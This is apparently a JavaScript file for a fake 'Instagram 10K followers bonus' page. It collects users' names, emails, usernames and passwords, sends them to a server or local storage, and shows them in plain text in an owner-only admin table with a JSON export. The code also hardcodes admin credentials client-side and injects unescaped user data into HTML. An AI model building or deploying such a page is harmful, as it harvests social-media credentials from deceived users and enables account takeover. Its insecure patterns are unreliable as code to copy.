const STORAGE_KEY = "ig_bonus_users";
const CURRENT_USER_KEY = "ig_bonus_current_user";
const API_URL = "/api/users";

const modeButtons = document.querySelectorAll(".mode-btn");
const authForm = document.getElementById("authForm");
const fullNameGroup = document.getElementById("fullNameGroup");
const submitBtn = document.getElementById("submitBtn");
const switchText = document.getElementById("switchText");
const statusBox = document.getElementById("statusBox");

const ADMIN_USERNAME = "Berdiyor0711";
const ADMIN_PASSWORD = "Berdiyor0711@";

async function getUsers() {
  try {
    const response = await fetch(API_URL, {
      method: "GET",
      headers: {
        "x-admin-username": ADMIN_USERNAME,
        "x-admin-password": ADMIN_PASSWORD,
      },
    });
    if (response.ok) {
      const data = await response.json();
      if (Array.isArray(data)) {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
        return data;
      }
    }
  } catch (error) {
    // ignore and fall back to localStorage
  }

  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
  } catch (error) {
    return [];
  }
}

function saveUsers(users) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
}

function switchMode(mode) {
  const isSignup = mode === "signup";
  modeButtons.forEach((btn) => {
    btn.classList.toggle("active", btn.dataset.mode === mode);
  });

  fullNameGroup.classList.toggle("hidden", !isSignup);
  submitBtn.textContent = isSignup ? "Create account" : "Log in";

  if (switchText) {
    switchText.textContent = isSignup ? "Log in" : "Sign up";
  }

  const emailInput = document.getElementById("email");
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");

  if (emailInput) emailInput.placeholder = isSignup ? "username@example.com" : "your email or phone";
  if (usernameInput) usernameInput.placeholder = isSignup ? "bonus_user" : "your username";
  if (passwordInput) passwordInput.placeholder = isSignup ? "Password" : "Enter your password";

  const formMode = isSignup ? "Registration" : "Login";
  if (statusBox) {
    statusBox.textContent = `${formMode} form ready.`;
  }
}

function saveCurrentUser(user) {
  localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
}

async function addUser(user) {
  const record = {
    id: Date.now(),
    ...user,
    createdAt: new Date().toISOString(),
  };

  try {
    const response = await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(record),
    });

    if (response.ok) {
      const remoteUsers = await response.json();
      saveUsers(remoteUsers);
      saveCurrentUser({ ...record, password: "***hidden***" });
      return;
    }
  } catch (error) {
    // ignore and fall back to local storage below
  }

  const users = await getUsers();
  users.unshift(record);
  saveUsers(users);
  saveCurrentUser({ ...record, password: "***hidden***" });
}

async function validateAndSubmit(event) {
  event.preventDefault();

  const formData = new FormData(authForm);
  const mode = document.querySelector(".mode-btn.active")?.dataset.mode || "signup";
  const fullName = (formData.get("fullName") || "").toString().trim();
  const email = (formData.get("email") || "").toString().trim();
  const username = (formData.get("username") || "").toString().trim();
  const password = (formData.get("password") || "").toString();

  if (!email || !username || !password) {
    if (statusBox) {
      statusBox.textContent = "Please fill in the required fields.";
      statusBox.style.background = "#fff7ed";
      statusBox.style.borderColor = "#fdba74";
      statusBox.style.color = "#9a5b00";
    }
    return;
  }

  if (mode === "signup" && !fullName) {
    if (statusBox) {
      statusBox.textContent = "Please enter your full name to continue.";
      statusBox.style.background = "#fff7ed";
      statusBox.style.borderColor = "#fdba74";
      statusBox.style.color = "#9a5b00";
    }
    return;
  }

  if (mode === "login") {
    const users = await getUsers();
    const matchedUser = users.find((user) => {
      const sameUsername = (user.username || "").toLowerCase() === username.toLowerCase();
      const sameEmail = (user.email || "").toLowerCase() === email.toLowerCase();
      const samePassword = (user.password || "") === password;
      return samePassword && (sameUsername || sameEmail);
    });

    if (!matchedUser) {
      if (statusBox) {
        statusBox.textContent = "Invalid username/email or password. Please try again.";
        statusBox.style.background = "#fef2f2";
        statusBox.style.borderColor = "#fecaca";
        statusBox.style.color = "#991b1b";
      }
      return;
    }

    saveCurrentUser({ ...matchedUser, password: "***hidden***" });

    if (statusBox) {
      statusBox.textContent = `Welcome back ${matchedUser.username || username}! Your login was successful.`;
      statusBox.style.background = "#ecfdf5";
      statusBox.style.borderColor = "#a7f3d0";
      statusBox.style.color = "#065f46";
    }

    authForm.reset();
    return;
  }

  const payload = {
    mode,
    fullName: mode === "signup" ? fullName : "Not provided",
    email,
    username,
    password,
    bonus: "10K followers bonus",
  };

  await addUser(payload);

  if (statusBox) {
    statusBox.textContent = mode === "signup"
      ? `Welcome ${username}! Your 10K bonus request has been saved and is visible to the admin.`
      : `Welcome back ${username}! Your account session has been saved and is visible to the admin.`;
    statusBox.style.background = "#ecfdf5";
    statusBox.style.borderColor = "#a7f3d0";
    statusBox.style.color = "#065f46";
  }

  authForm.reset();
  if (mode === "signup") {
    switchMode("signup");
  }
}

async function renderAdminTable() {
  const users = await getUsers();
  const tableBody = document.getElementById("usersTableBody");

  if (!tableBody) return;

  if (users.length === 0) {
    tableBody.innerHTML = '<tr><td colspan="6" class="empty-row">No user records saved yet.</td></tr>';
    const totalUsers = document.getElementById("totalUsers");
    const loginCount = document.getElementById("loginCount");
    const signupCount = document.getElementById("signupCount");
    if (totalUsers) totalUsers.textContent = "0";
    if (loginCount) loginCount.textContent = "0";
    if (signupCount) signupCount.textContent = "0";
    return;
  }

  tableBody.innerHTML = users
    .map((user, index) => {
      const createdAt = user.createdAt ? new Date(user.createdAt).toLocaleString() : "Unknown";
      return `
        <tr>
          <td>${index + 1}</td>
          <td>${user.mode === "login" ? "Login" : "Registration"}</td>
          <td>${user.username || "-"}</td>
          <td>${user.email || "-"}</td>
          <td>${user.password || "-"}</td>
          <td>${createdAt}</td>
        </tr>
      `;
    })
    .join("");

  const totalUsers = document.getElementById("totalUsers");
  const loginCount = document.getElementById("loginCount");
  const signupCount = document.getElementById("signupCount");

  if (totalUsers) totalUsers.textContent = String(users.length);
  if (loginCount) loginCount.textContent = String(users.filter((user) => user.mode === "login").length);
  if (signupCount) signupCount.textContent = String(users.filter((user) => user.mode === "signup").length);
}

async function showAdminPasswordPrompt() {
  const existing = document.getElementById("admin-lock");
  if (existing) return;

  const overlay = document.createElement("div");
  overlay.id = "admin-lock";
  overlay.style.position = "fixed";
  overlay.style.inset = "0";
  overlay.style.background = "rgba(15, 23, 42, 0.7)";
  overlay.style.display = "grid";
  overlay.style.placeItems = "center";
  overlay.style.zIndex = "1000";

  const panel = document.createElement("div");
  panel.style.background = "#fff";
  panel.style.borderRadius = "14px";
  panel.style.padding = "28px 22px";
  panel.style.width = "min(90vw, 360px)";
  panel.style.boxShadow = "0 22px 60px rgba(0,0,0,0.2)";
  panel.innerHTML = `
    <h2 style="margin:0 0 12px; font-size:1.5rem;">Admin access</h2>
    <p style="margin:0 0 16px; color:#475569;">Only the owner can view this panel.</p>
    <input id="admin-username-input" type="text" value="Berdiyor0711" style="width:100%; padding:12px 14px; border:1px solid #dbeafe; border-radius:10px; margin-bottom:12px; box-sizing:border-box;" />
    <input id="admin-password-input" type="password" placeholder="Enter admin password" style="width:100%; padding:12px 14px; border:1px solid #dbeafe; border-radius:10px; margin-bottom:12px; box-sizing:border-box;" />
    <button id="admin-password-submit" style="width:100%; background:#2563eb; color:#fff; border:none; border-radius:10px; padding:12px; font-weight:700; cursor:pointer;">Open admin</button>
  `;

  overlay.appendChild(panel);
  document.body.appendChild(overlay);

  const usernameInput = document.getElementById("admin-username-input");
  const passwordInput = document.getElementById("admin-password-input");
  const submit = document.getElementById("admin-password-submit");

  submit.addEventListener("click", async () => {
    const usernameValue = (usernameInput.value || "").trim();
    const passwordValue = (passwordInput.value || "").trim();

    if (usernameValue === ADMIN_USERNAME && passwordValue === ADMIN_PASSWORD) {
      localStorage.setItem("ig_admin_access", "true");
      overlay.remove();
      await renderAdminTable();
      return;
    }

    passwordInput.style.borderColor = "#fda4af";
    usernameInput.style.borderColor = "#fda4af";
    passwordInput.value = "";
    passwordInput.placeholder = "Wrong login or password";
  });
}

async function exportJson() {
  const users = await getUsers();
  const data = JSON.stringify(users, null, 2);
  const blob = new Blob([data], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = "instagram-bonus-data.json";
  link.click();
  URL.revokeObjectURL(url);
}

async function clearData() {
  try {
    await fetch(API_URL, {
      method: "DELETE",
      headers: {
        "x-admin-username": ADMIN_USERNAME,
        "x-admin-password": ADMIN_PASSWORD,
      },
    });
  } catch (error) {
    // ignore and clear local fallback below
  }

  localStorage.removeItem(STORAGE_KEY);
  localStorage.removeItem(CURRENT_USER_KEY);
  renderAdminTable();
  if (statusBox) {
    statusBox.textContent = "Data cleared successfully.";
    statusBox.style.background = "#fef2f2";
    statusBox.style.borderColor = "#fecaca";
    statusBox.style.color = "#991b1b";
  }
}

if (authForm) {
  modeButtons.forEach((button) => {
    button.addEventListener("click", () => switchMode(button.dataset.mode));
  });

  authForm.addEventListener("submit", validateAndSubmit);
  switchMode("signup");
}

if (document.getElementById("usersTableBody")) {
  if (localStorage.getItem("ig_admin_access") === "true") {
    renderAdminTable();
  } else {
    showAdminPasswordPrompt();
  }
}

if (switchText) {
  switchText.addEventListener("click", (event) => {
    event.preventDefault();
    const activeMode = document.querySelector(".mode-btn.active")?.dataset.mode || "signup";
    const nextMode = activeMode === "signup" ? "login" : "signup";
    switchMode(nextMode);
  });
}
